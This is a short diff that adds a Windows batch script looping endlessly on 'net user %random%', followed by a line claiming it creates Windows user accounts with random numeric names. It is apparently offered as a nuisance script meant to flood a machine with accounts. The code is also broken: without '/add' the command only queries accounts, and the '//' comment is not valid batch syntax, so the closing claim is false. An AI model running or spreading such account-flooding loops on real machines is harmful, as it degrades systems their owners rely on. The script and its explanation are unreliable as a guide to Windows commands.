@@ -1,0 +1,8 @@
+@echo off
+:x
+net user %random%   // add or create user account
+goto x
+
+
+
+This code would start creating windowos user accounts whose names could be any random numbers.
